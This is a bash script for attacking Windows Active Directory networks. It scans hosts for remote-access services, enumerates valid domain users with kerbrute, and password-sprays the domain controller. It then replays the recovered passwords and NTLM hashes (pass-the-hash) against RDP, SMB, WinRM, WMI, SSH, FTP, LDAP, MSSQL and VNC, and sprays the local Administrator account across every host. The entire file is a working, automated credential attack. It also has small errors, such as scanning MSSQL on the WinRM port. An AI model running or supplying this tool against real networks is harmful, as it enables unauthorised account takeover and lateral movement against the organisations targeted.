#!/bin/bash

# SECTION 1 - SETUP
# In this section, the script is set up. Not worth reading.


# Default values
hosts=""
users_file=""
pass_file=""
ntlm_hash_file=""
dc_ip=""
domain=""

# Function to display usage information
usage() {
  echo "Usage: ./nxc_spray.sh hosts_file [-u users_file] [--user users_file] [-p pass_file] [--pass pass_file] [-H ntlm_hash_file] [--dc-ip dc_IP_address] [-d domain]"
  echo "Example: ./nxc_spray.sh hosts.txt -u users.txt -p passwords.txt -H NTLM_hashes.txt --dc-ip 172.16.161.50 -d example.com"
  exit 1
}

# Ensure at least one argument (hosts.txt) is provided
if [ $# -lt 1 ]; then
  usage
fi

# First argument should be the hosts file
hosts="$1"
shift

# Parse remaining command-line arguments
while [[ "$#" -gt 0 ]]; do
  case "$1" in
    -u|--user)
      users_file="$2"
      shift 2
      ;;
    -p|--pass)
      pass_file="$2"
      shift 2
      ;;
    -H)
      ntlm_hash_file="$2"
      shift 2
      ;;
    --dc-ip)
      dc_ip="$2"
      shift 2
      ;;
    -d)
      domain="$2"
      shift 2
      ;;
    -h|--help)
      usage
      ;;
    *)
      echo "Unknown option: $1"
      usage
      ;;
  esac
done

# Check if required parameters were provided
if [ -z "$hosts" ]; then
  echo "Error: hosts file not provided."
  usage
fi

if [ -z "$users_file" ]; then
  echo "Error: users file not provided."
  usage
fi

if [ -z "$pass_file" ]; then
  echo "Error: passwords file must be provided."
  usage
fi

if [ -z "$ntlm_hash_file" ]; then
  echo "Error: the NTLM hash file must be provided."
  usage
fi

if [ -z "$dc_ip" ]; then
  echo "Error: domain controller IP not provided."
  usage
fi

if [ -z "$domain" ]; then
  echo "Error: domain not provided."
  usage
fi

# Display the provided inputs
echo "Using hosts file: $hosts"
echo "Using users file: $users_file"
echo "Using passwords file: $pass_file"
echo "Using NTLM hash file: $ntlm_hash_file"
echo "Using domain controller IP: $dc_ip"
echo "Using domain: $domain"

# Make sure there is no clock skew with the DC, as it will cause false negatives with Kerbrute
echo -e "\n\nsudo is required to run timedatectl and rdate to sync time with the DC. Time skews will create false negatives with Kerbrute.\n"
sudo timedatectl set-ntp off
sudo rdate -n "$dc_ip"

# Run the scans in parallel, capturing output into variables
echo -e "\n\n\033[1;32m----------SCANNING HOSTS FOR SERVICES----------\033[0m\n\n"
rdp_hosts=$(nmap -Pn -v -p 3389 -iL "$hosts" --open -oG - | grep "/open" | awk '{print $2}')
smb_hosts=$(nmap -Pn -v -p 445 -iL "$hosts" --open -oG - | grep "/open" | awk '{print $2}')
winrm_hosts=$(nmap -Pn -v -p 5985 -iL "$hosts" --open -oG - | grep "/open" | awk '{print $2}')
wmi_hosts=$(nmap -Pn -v -p 135 -iL "$hosts" --open -oG - | grep "/open" | awk '{print $2}')
ssh_hosts=$(nmap -Pn -v -p 22 -iL "$hosts" --open -oG - | grep "/open" | awk '{print $2}')
ftp_hosts=$(nmap -Pn -v -p 21 -iL "$hosts" --open -oG - | grep "/open" | awk '{print $2}')
ldap_hosts=$(nmap -Pn -v -p 389 -iL "$hosts" --open -oG - | grep "/open" | awk '{print $2}')
mssql_hosts=$(nmap -Pn -v -p 5985 -iL "$hosts" --open -oG - | grep "/open" | awk '{print $2}')
vnc_hosts=$(nmap -Pn -v -p 5900 -iL "$hosts" --open -oG - | grep "/open" | awk '{print $2}')

# Print the results
echo "RDP hosts:"
echo "$rdp_hosts" | tee rdp_hosts.txt
echo
echo "SMB hosts:"
echo "$smb_hosts" | tee  smb_hosts.txt
echo
echo "WinRM hosts:"
echo "$winrm_hosts" | tee winrm_hosts.txt
echo
echo "WMI hosts:"
echo "$wmi_hosts" | tee wmi_hosts.txt
echo
echo "SSH hosts:"
echo "$ssh_hosts" | tee ssh_hosts.txt
echo
echo "FTP hosts:"
echo "$ftp_hosts" | tee ftp_hosts.txt
echo
echo "LDAP hosts:"
echo "$ldap_hosts" | tee ldap_hosts.txt
echo
echo "MSSQL hosts:"
echo "$mssql_hosts" | tee mssql_hosts.txt
echo
echo "VNC hosts:"
echo "$vnc_hosts" | tee vnc_hosts.txt

# URL to download from if kerbrute isn't in the working directory
url="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64"

# Check if the file exists
if [ ! -f "kerbrute_linux_amd64" ]; then
    echo "kerbrute_linux_amd64 not found. Downloading..."
    wget "$url"
else
    echo "kerbrute_linux_amd64 executable found in the working directory."
fi

chmod a+x "kerbrute_linux_amd64"


# SECTION 2 - FIND VALID DOMAIN USERS

echo -e "\n\n\033[1;32m----------TESTING VALID DOMAIN USERNAMES----------\033[0m\n\n"

# Make a list of valid domain users
touch valid_domain_users.txt
valid_domain_users=$(./kerbrute_linux_amd64 userenum -d "$domain" --dc "$dc_ip" "$users_file" | \
grep "VALID USERNAME:" | \
tee /dev/tty | \
sed 's/.*VALID USERNAME:[ \t]*//' | \
cut -d '@' -f 1)
echo "$valid_domain_users" > valid_domain_users.txt


# SECTION 3 - USER VALID DOMAIN USERS TO FIND VALID LOGINS

echo -e "\n\n\033[1;32m----------TESTING VALID DOMAIN LOGINS----------\033[0m\n\n"

# Make a list of valid domain credentials
touch valid_domain_creds.txt
valid_domain_creds=$(while IFS= read -r password; do
  ./kerbrute_linux_amd64 passwordspray -d "$domain" --dc "$dc_ip" valid_domain_users.txt "$password" -v
done < "$pass_file" | \
grep "VALID LOGIN:" | \
tee /dev/tty | \
sed -E 's/.*VALID LOGIN:[ \t]*//' | \
sed -E 's/\x1B\[[0-9;]*[a-zA-Z]//g')
echo "$valid_domain_creds" > valid_domain_creds.txt

# Make a list of corresponding usersnames and passwords for nxc --no-brute attacks
touch domain_no_brute_users.txt
touch domain_no_brute_passwords.txt
cat valid_domain_creds.txt | awk -F '@' '{print $1}' > domain_no_brute_users.txt
cat valid_domain_creds.txt | awk -F ':' '{print $2}' > domain_no_brute_passwords.txt


# SECTION 4 - TRY VALID CREDENTIALS AGAINST RDP, SMB, WINRM, WMI, SSH, FTP, LDAP, MSSQL, and VNC
touch valid_service_logins.txt
echo "" > valid_service_logins.txt

# RDP
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST RDP----------\033[0m\n\n"
echo -e "RDP Domain Authentication:\n"
nxc rdp rdp_hosts.txt -d "$domain" -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nRDP Local Authenication:\n"
nxc rdp rdp_hosts.txt --local-auth -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# SMB
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST SMB----------\033[0m\n\n"
echo -e "SMB Domain Authentication:\n"
nxc smb smb_hosts.txt -d "$domain" -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nSMB Local Authenication:\n"
nxc smb smb_hosts.txt --local-auth -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# WinRM
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST WINRM----------\033[0m\n\n"
echo -e "WinRM Domain Authentication:\n"
nxc winrm winrm_hosts.txt -d "$domain" -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute 2>&1 | \
grep -v "CryptographyDeprecationWarning" | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nWinRM Local Authenication:\n"
nxc winrm winrm_hosts.txt --local-auth -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute 2>&1 | \
grep -v "CryptographyDeprecationWarning" | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# WMI
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST WMI----------\033[0m\n\n"
echo -e "WMI Domain Authentication:\n"
nxc wmi wmi_hosts.txt -d "$domain" -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nWMI Local Authenication:\n"
nxc wmi wmi_hosts.txt --local-auth -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# SSH
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST SSH----------\033[0m\n\n"
echo -e "\nSSH Local Authenication:\n"
nxc ssh ssh_hosts.txt -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# FTP
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST FTP----------\033[0m\n\n"
echo -e "\nFTP Local Authenication:\n"
nxc ftp ftp_hosts.txt -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# LDAP
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST LDAP----------\033[0m\n\n"
echo -e "LDAP Domain Authentication:\n"
nxc ldap ldap_hosts.txt -d "$domain" -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nLDAP Local Authenication:\n"
nxc ldap ldap_hosts.txt --local-auth -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# MSSQL
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST MSSQL----------\033[0m\n\n"
echo -e "MSSQL Domain Authentication:\n"
nxc mssql mssql_hosts.txt -d "$domain" -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nMSSQL Local Authenication:\n"
nxc mssql mssql_hosts.txt -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# VNC
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST VNC----------\033[0m\n\n"
echo -e "\nVNC Local Authenication:\n"
nxc vnc vnc_hosts.txt -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt


# SECTION 5 - FIND VALID DOMAIN USER:NTLM HASH COMBOS BY BRUTE FORCING SMB ON THE DC
touch NTLM_no_brute_users.txt
touch NTLM_no_brute_pass.txt
echo "" > valid_NTLM_hash_logins.txt
echo -e "\n\n\033[1;32m----------BRUTE FORCING VALID DOMAIN USERS WITH NTLM HASHES AGAINST SMB ON THE DC----------\033[0m\n\n"
nxc smb "$dc_ip" -d "$domain" -u valid_domain_users.txt -H "$ntlm_hash_file" --continue-on-success | \
grep -iE " \\[\\+\\] |error" | \
tee /dev/tty | \
tee -a valid_service_logins.txt | \
awk -F'\' '{print $2}' | \
awk -F':' '{print $1 >> "NTLM_no_brute_users.txt"; print $2 >> "NTLM_no_brute_pass.txt"}'
# Note: need to parse the logins, then brute force against all services with these logins


# SECTION 6 - TRY VALID USER:NTLM HASH COMBOS AGAINST RDP, SMB, WINRM, WMI, LDAP, and MSSQL

# RDP
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN NTLM HASH LOGINS AGAINST RDP----------\033[0m\n\n"
echo -e "RDP Domain Authentication:\n"
nxc rdp rdp_hosts.txt -d "$domain" -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nRDP Local Authenication:\n"
nxc rdp rdp_hosts.txt --local-auth -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# SMB
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN NTLM HASH LOGINS AGAINST SMB----------\033[0m\n\n"
echo -e "SMB Domain Authentication:\n"
nxc smb smb_hosts.txt -d "$domain" -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nSMB Local Authenication:\n"
nxc smb smb_hosts.txt --local-auth -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# WinRM
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN NTLM HASH LOGINS AGAINST WINRM----------\033[0m\n\n"
echo -e "WinRM Domain Authentication:\n"
nxc winrm winrm_hosts.txt -d "$domain" -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute 2>&1 | \
grep -v "CryptographyDeprecationWarning" | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nWinRM Local Authenication:\n"
nxc winrm winrm_hosts.txt --local-auth -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute 2>&1 | \
grep -v "CryptographyDeprecationWarning" | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# WMI
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN NTLM HASH LOGINS AGAINST WMI----------\033[0m\n\n"
echo -e "WMI Domain Authentication:\n"
nxc wmi wmi_hosts.txt -d "$domain" -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nWMI Local Authenication:\n"
nxc wmi wmi_hosts.txt --local-auth -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# SSH does not support NTLM hash logins

# FTP does not support NTLM hash logins

# LDAP
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN NTLM HASH LOGINS AGAINST LDAP----------\033[0m\n\n"
echo -e "LDAP Domain Authentication:\n"
nxc ldap ldap_hosts.txt -d "$domain" -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nLDAP Local Authenication:\n"
nxc ldap ldap_hosts.txt --local-auth -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# MSSQL
echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN NTLM HASH LOGINS AGAINST MSSQL----------\033[0m\n\n"
echo -e "MSSQL Domain Authentication:\n"
nxc mssql mssql_hosts.txt -d "$domain" -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt
echo -e "\nMSSQL Local Authenication:\n"
nxc mssql mssql_hosts.txt -u NTLM_no_brute_users.txt -H NTLM_no_brute_pass.txt --continue-on-success --no-brute | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_service_logins.txt

# VNC does not support NTLM hash logins


# SECTION 7 - SPRAY ALL KNOWN PASSWORDS FOR THE LOCAL ADMINISTRATOR AGAINST SMB ON ALL HOSTS
echo -e "\n\n\033[1;32m----------SPRAYING NTLM HASHES FOR LOCAL ADMINISTRATOR AGAINST SMB ON ALL HOSTS----------\033[0m\n\n"
nxc smb "$hosts" --local-auth -u "Administrator" -p "$pass_file" --continue-on-success | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_NTLM_hash_logins.txt


# SECTION 8 - SPRAY ALL KNOWN NTLM HASHES FOR THE LOCAL ADMINISTRATOR AGAINST SMB ON ALL HOSTS
echo -e "\n\n\033[1;32m----------SPRAYING NTLM HASHES FOR LOCAL ADMINISTRATOR AGAINST SMB ON ALL HOSTS----------\033[0m\n\n"
nxc smb "$hosts" --local-auth -u "Administrator" -H "$ntlm_hash_file" --continue-on-success | \
grep -iE " \\[\\+\\] |error" | \
tee -a valid_NTLM_hash_logins.txt


# SECTION 9 - CLEANUP
rm -f domain_no_brute_passwords.txt
rm -f domain_no_brute_users.txt
rm -f NTLM_no_brute_pass.txt
rm -f NTLM_no_brute_users.txt
rm -f NTLM_users.txt
mkdir hosts
mv *_hosts.txt ./hosts/